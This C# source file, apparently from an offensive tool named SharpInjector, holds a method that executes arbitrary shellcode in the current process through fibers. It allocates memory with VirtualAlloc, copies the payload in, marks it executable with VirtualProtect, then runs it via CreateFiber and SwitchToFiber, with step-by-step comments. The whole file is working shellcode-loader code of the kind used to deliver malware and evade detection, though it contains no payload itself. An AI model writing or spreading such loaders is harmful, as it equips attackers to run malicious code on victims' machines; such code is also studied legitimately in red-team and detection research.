using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SharpInjector
{
    class CreateFiber
    {
        public static void ExecuteCreateFiber(byte[] Shellcode)
        {
            //1. Convert the main thread into a fiber with the ConvertThreadToFiber function
            IntPtr fiberAddr = WinAPI.ConvertThreadToFiber(IntPtr.Zero);

            Console.WriteLine("[*] Allocating shellcode in current process...");
            //2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
            IntPtr address = WinAPI.VirtualAlloc(IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);

            //3.Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
            IntPtr ShellCode_Pointer = Marshal.AllocHGlobal(Shellcode.Length);
            Marshal.Copy(Shellcode, 0, ShellCode_Pointer, Shellcode.Length);
            WinAPI.RtlCopyMemory(address, ShellCode_Pointer, Shellcode.Length);

            //4.Change the memory page permissions to Execute/ Read with VirtualProtect
            WinAPI.VirtualProtect(address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect);

            Console.WriteLine("[*] Calling CreateFiber...");
            //5.Call CreateFiber on shellcode address
            IntPtr fiber = WinAPI.CreateFiber(0, address, IntPtr.Zero);
            if (fiber == IntPtr.Zero)
            {
                //clean
                Marshal.FreeHGlobal(ShellCode_Pointer);
                //return
                return;
            }

            //6.Call SwitchToFiber to start the fiber and execute the shellcode
            WinAPI.SwitchToFiber(fiber);
            //For some reason, switch to fiber for the main thread as well. NOT SURE ABOUT THIS
            WinAPI.SwitchToFiber(fiberAddr);

            //CLEAN UP AFTERWARDS.
            Marshal.FreeHGlobal(ShellCode_Pointer);
        }
    }
}
